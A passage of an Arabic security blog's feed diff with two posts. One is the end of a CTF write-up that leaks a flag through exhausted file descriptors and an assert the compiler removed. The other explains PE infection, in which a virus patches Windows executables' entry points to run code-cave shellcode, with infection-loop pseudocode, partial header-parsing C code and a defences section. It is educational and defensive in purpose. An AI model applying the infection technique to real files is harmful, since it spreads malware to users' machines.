+  &lt;span class=&quot;n&quot;&gt;setrlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RLIMIT_FSIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;في محاولة إخرى نرى وجود عملية السيرفر التنفيذية أيضا موجودة
+والذي بدوره يحتوي على كلمة DrgnS وحجمه أصغر 
+يمكننا إستغلاله لتنفيد نفس العملية متجاوزين شرط الحجم&lt;/p&gt;
+
+&lt;p&gt;أيضا نلاحظ وجود حد أقصى اخر وهو&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;rlim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_cur&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rlim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;setrlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RLIMIT_CPU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;والذي سيحدد وقت لإستخدامنا لمواد السيرفر 
+سنقوم بقراءة ملفات على شكل سطر في كل مرة مما ينتج عنه وقت طويل يؤدي لتجاوز هذا الحد بدوره سيغلق السيرفر الإتصال
+لتجاوز هذا الحد سنقوم بإستخدام أقل الملفات حجما&lt;/p&gt;
+
+&lt;h3 id=&quot;تنظيم-الأفكار&quot;&gt;تنظيم الأفكار&lt;/h3&gt;
+&lt;p&gt;بعد العثور على عدة ثغرات تمكننا من جمعها مع بعض للوصل للهدف المطلوب
+يمكننا الآن ترتيب أفكارنا والبدء بالإستغلال&lt;/p&gt;
+
+&lt;p&gt;لدينا 3 file descriptors يقوم النظام بفتحها بشكل أساسي
+الخطوة الإولى 
+فتح ملف أحد الأغاني حتى ماقبل الحد الأقصى ١٥ مرة
+الخطوة الثانية نبدأ بفتح ملف السيرفر ١٣ مرة ونقرأه حتى نصل لكلمة DrgnS
+بذلك لن يتم إغلاقه وسيتم في كل مرة زيادة عدد الملفات المفتوحة
+الخطوة الثالثة
+الآن مجموع الملفات المفتوحة 
+3 + 15 + 13 = 31
+يمكننا الآن البدء بقراءة أحد ملفات الإغنية حتى اخر سطر ونتوقف
+الخطوة الرابعة 
+نظرآ لعدم زيادة العدد رسميآ يمكننا فتح ملف اخر للوصل ل ١٦
+وذلك الملف سيكون هو ملف العلم
+سيتم فتح الملف عند السطر الأول لدالة open
+الآن أصبح لدينا ٣٢ ملف مفتوح وصلنا للحد الأقصى
+لذلك الإستدعاء الثاني للدالة سيفشل متجاوز أغلاق الملف وشرط التأكد من أنه ملف العلم&lt;/p&gt;
+
+&lt;iframe src=&quot;https://pastebin.com/embed_iframe/u95sg9nR&quot; style=&quot;border:none;width:100%;height: 500px&quot;&gt;&lt;/iframe&gt;
+&lt;p&gt;الخطوة الخامسة
+الآن يمكننا قراءة ملف العلم وهو رقم ١٥ 
+ستفشل القراءة نظرا لوجود كلمة DrgnS لكن بالثغرة التي توصلنا لها
+تم تحميل بيانات العلم في الذاكرة وستظهر لنا رسالة خطأ
+الخطوة السادسة
+الآن يمكننا قراءة السطر مابعد الأخير من ملف الإغنية مؤديا لإرجاع -1 
+متجاوز شرط التأكد من وجود DrgnS وسيقوم بطباعة البفر بكامل مايحتويه
+ومن ضمنه بيانات العلم المحملة سابقآ&lt;/p&gt;
+
+&lt;h3 id=&quot;الحل-النهائي&quot;&gt;الحل النهائي&lt;/h3&gt;
+&lt;p&gt;قمت بإستخدم أحد المكتبات الرائعة المبرمجة بالبايثون pwn
+لتسهيل الإتصال بالسيرفر وتطبيق العمليات بدون التدخل اليدوي&lt;/p&gt;
+
+&lt;iframe src=&quot;https://pastebin.com/embed_iframe/q8JgeXd0&quot; style=&quot;border:none;width:100%; height: 900px&quot;&gt;&lt;/iframe&gt;
+&lt;h3 id=&quot;حل-المشكلة&quot;&gt;حل المشكلة&lt;/h3&gt;
+&lt;p&gt;في الختام نرى خطورة إستخدام assert بدون حذر ودمجها مع بعض الأوامر المهمة قد يجعل الكومبايلر يتخلص منها معرضآ الملف التنفيذي لثغرات يمكن إستغلالها لاحقأ
+بالرغم من الشروط العديدة المصممة لمنعك من الوصول للعلم 
+إلا أنه بمجرد وضع إستدعاء دالة إغلاق الملف خارج الـ assertion ستفشل الطريقة السابقة في الوصول له.&lt;/p&gt;
+
+&lt;h3 id=&quot;الآلية-بالكامل&quot;&gt;الآلية بالكامل&lt;/h3&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// البحث عن جميع الملفات في حلقة تكرار&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// فتح الملف وتخزين نقطة الإدخال القديمة والبحث عن Code Cave&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// عند الحصول على مساحة كافية. كتابة الشل كود وحفظ عنوان بداية الشل كود&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// كتابة قفزة JMP لعنوان نقطة الإدخال الأصلي عن الإنتهاء من تنفيذ الشل كود &lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// تعديل نقطة الإدخال لعنوان الشل كود&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// حفظ تعديلات الملف&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// الملف التالي ...&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;طرق-الحماية&quot;&gt;طرق الحماية&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;من أهم الطرق المتبعة مايسمى Pattern recognition
+وهو تخزين الشل كود أو جزء منه. على سبيل المثال بايتات رابط الملف فالشل كود
+ثم البحث في بايتات الملفات عنه. فعند وجوده يعني أن الملف مصاب ويمكن بسهولة علاجه بتعديل نقطة الإدخال وحذف الشل كود. وتطبيق هذه الطريقة على جميع الملفات 
+إلا أنه يمكن تجاوز هذه الطريقة بإستخدام عدة تقنيات منها مايسمى polymorphic code وهي تقنية تقوم بإصدار كود مختلف في كل مرة ولكن يؤدي نفس العمل
+أو بمجرد وضع بعض من العشوائية في الشل كود&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;File verification
+من طرق الحماية الإخرى والتي يمكن إتباعها للحماية من عدة هجمات للتأكد من سلامة الملف.
+عن طريق إصدار وإسم الملف يمكنك مقارنته مع الملف الرسمي بعدة طرق
+أما رفع الملف في مواقع المقارنة وفحص الملفات لمقارنة الهاش الخاص بالملف 
+أو عن طريق موجه أوامر وندوز بإستعمال الأمر&lt;/p&gt;
+    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;n&quot;&gt;FC&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathname1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathname2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;فعند وجود إختلاف بالرغم من تطابق الإصدار والشركة والحجم فلابد من فحص الجهاز والملف للتأكد من سلامة جهازك.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><summary type="html">من مشاركتي مع فريق @Shellphish إنتهت المسابقة بحصول الفريق على المركز الأول وكان هذا أحد التحديات الممتعة والمليئة بالمعلومات.</summary></entry><entry><title type="html">آلية عمل PE Infection</title><link href="http://localhost:4000/misc/2018/08/12/PeInfection.html" rel="alternate" type="text/html" title="آلية عمل PE Infection" /><published>2018-08-12T04:51:01-07:00</published><updated>2018-08-12T04:51:01-07:00</updated><id>http://localhost:4000/misc/2018/08/12/PeInfection</id><content type="html" xml:base="http://localhost:4000/misc/2018/08/12/PeInfection.html">&lt;p&gt;توجد طرق إنتشار عديدة للبرمجيات الخبيثة عبر ثغرات الشبكات وغيرها. ولكن من الطرق المهمل ذكرها في المجتمع السيبراني العربي ما أكتب عنه هذا المقال. أتمنى أن يعود بفائدة للقارئ في حماية نفسه من مخاطر إنتشار البرمجيات الخبيثة.
+طرق الحماية في نهاية المقال. 
+كما سأشرح بإختصار آلية عملها للمهتمين فالأمن السايبراني.&lt;/p&gt;
+
+&lt;h2 id=&quot;ماهي&quot;&gt;ماهي&lt;/h2&gt;
+&lt;p&gt;عدوى الملفات التنفيذية أو PE Infection
+هي من أقدم الطرق المستخدمة في نشر الملفات الخبيثة من باك دورز أو فايروسات وغيره في الجهاز. هي طريقة مستوحاة من الإلتهاب وكيفية إنتشاره لما يحيط به من خلايا الجسم. 
+تكمن قوة الآلية في كونها تصيب أغلب الملفات التنفيذية في الجهاز المستهدف وبدوره يكون كل ملف مصاب وسيلة لنشر العدوى. فعند نقل أي ملف تنفيدي من جهاز مصاب لجهاز آخر ثم تنفيذه يعني ذلك إصابة جهاز جديد.&lt;/p&gt;
+
+&lt;p&gt;تعمل الفكرة على أغلب الأنظمة المعروفة ولكن سأتطرق لعملها على نظام Windows فقط لفعاليتها العالية على هذا النظام تحديداً وفشلها لأسباب عدة فالأنظمة الإخرى سنتطرق لها لاحقاً.
+كما تشير كلمة PE في العنوان إلى Portable Executabe وهي تركيبة الملفات التنفيذية المستخدمة في نظام Windows.&lt;/p&gt;
+
+&lt;h3 id=&quot;كيفية-عملها&quot;&gt;كيفية عملها&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;/content/peinfc.jpg&quot; alt=&quot;peinfc&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;مخاطرها&quot;&gt;مخاطرها&lt;/h3&gt;
+&lt;p&gt;سرعة الإنتشار العالية. وعملها بصمت بحيث يعمل كل ملف في جهازك لصالح الإنتشار بدون علمك. كون الملفات تعمل بشكل طبيعي.
+أيضا صعوبة التخلص منها. وسهولة مرورها على بعض الخبراء الأمنيين غير المطلعين على هذه الآلية. فيمكن أن يعتقد الخبير الأمني بأنه تخلص من كل أثر لأداة التجسس على سبيل المثال، دون أن يعلم بأنه بمجرد تنفيذه لملف آخر في جهازه سيقوم الملف بتحميل الأداة وتنفيذها مرة إخرى.&lt;/p&gt;
+
+&lt;p&gt;أما الآن فماهي تفاصيل الآلية. 
+قبل أن أتطرق لكيفية التنفيذ لابد أن نعرف تركيبة الملفات التنفيذية وكيف تعمل لإستغلالها.&lt;/p&gt;
+
+&lt;p&gt;ملاحظة: لفهم الشرح بشكل أفضل يفضل أن تكون على علم بكيفية عمل الذاكرة والملفات   في الجهاز Virutal &amp;amp; Base Addressing&lt;/p&gt;
+
+&lt;h3 id=&quot;كيف-تعمل-ملفات-windows-التنفيذية-exe-32-bit&quot;&gt;كيف تعمل ملفات Windows التنفيذية (Exe 32-bit)&lt;/h3&gt;
+&lt;p&gt;يتضمن عمل الملف التنفيذي الكثير من العمليات اللتي يطول شرحها لتهيئة النظام والملف للتنفيذ. ولكن مايهمنا هو نقطة بداية الملف أو مايسمى Entry point
+وهو العنوان اللذي يبدأ النظام تنفيد أكواد الملف من عنده.&lt;/p&gt;
+
+&lt;p&gt;يتكون الملف التنفيذي كبقية الملفات من بايتات عبارة عن معلومات عن الملف والكود التنفيذي والبيانات من نصوص وغيرها.&lt;/p&gt;
+
+&lt;p&gt;تركيبة الملف التنفيذي:
+&lt;img src=&quot;/content/mzhead.jpg&quot; alt=&quot;mzhead&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;يهمنا PE Header أو NT Header وهو ستركتشر آخر يحتوى على معلومات مهمة لتنفيذ الآلية&lt;/p&gt;
+
+&lt;p&gt;مانبحث عنه هو نقطة الإدخال Entry Point
+لأنه بتعديل تلك النقطة لعنوان آخر سيقوم النظام بتنفيد الملف من تلك النقطة
+واللتي يمكننا إستغلالها بوضع كود خاص مهمته تحميل الملف وتنفيده. ثم ننفذ نقطة الإدخال السابقة قبل التعديل بعد تنفيذ مانريد فيعمل الملف بشكل طبيعي من نقطة الإدخال الإصلية.&lt;/p&gt;
+
+&lt;p&gt;يجب أيضآ أن لا ننسى الإحتفاظ بعنوان نقطة الإدخال السابق للعودة إليه لتنفيد الملف بشكل طبيعي
+قبل تعديل الـ AddressOfEntryPoint لتشير للكود اللذي نريد تنفيذه فالملف&lt;/p&gt;
+
+&lt;p&gt;يمكننا الإطلاع على الستركتشرز من msdn&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IMAGE_NT_HEADERS&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;                   &lt;span class=&quot;n&quot;&gt;Signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;IMAGE_FILE_HEADER&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;FileHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;IMAGE_OPTIONAL_HEADER32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OptionalHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IMAGE_NT_HEADERS32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIMAGE_NT_HEADERS32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;نقطة الإدخال توجد في IMAGE_OPTIONAL_HEADER&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IMAGE_OPTIONAL_HEADER&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;Magic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;MajorLinkerVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;MinorLinkerVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;SizeOfCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;SizeOfInitializedData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;SizeOfUninitializedData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;AddressOfEntryPoint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;BaseOfCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;BaseOfData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;فعالية هذه الآلية في نظام وندوز تعتمد على وجود صلاحيات كتابة لباقي الملفات المجاورة. على عكس الأنظمة المتبقية التي تفشل فيها بسبب التشديد في صلاحيات فتح وقراءة وتعديل الملفات.
+مثال على فتح ملف والحصول على موقع تعديل نقطة الإدخال وحفظ نقطة الإدخال القديمة&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;LPCSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fileName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;..&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
+    &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hFileMapping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpFileBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;PIMAGE_DOS_HEADER&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dosHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;PIMAGE_NT_HEADERS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;peHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;PIMAGE_SECTION_HEADER&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sectionHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateFileA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GENERIC_READ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FILE_SHARE_READ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OPEN_EXISTING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FILE_ATTRIBUTE_NORMAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INVALID_HANDLE_VALUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CreateFile failed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    
+    &lt;span class=&quot;n&quot;&gt;hFileMapping&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateFileMapping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PAGE_READONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hFileMapping&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CreateFileMapping failed &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    
+    &lt;span class=&quot;n&quot;&gt;lpFileBase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MapViewOfFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hFileMapping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FILE_MAP_READ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpFileBase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MapViewOfFile failed &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hFileMapping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    
+    &lt;span class=&quot;n&quot;&gt;dosHeader&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIMAGE_DOS_HEADER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpFileBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dosHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e_magic&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IMAGE_DOS_SIGNATURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    
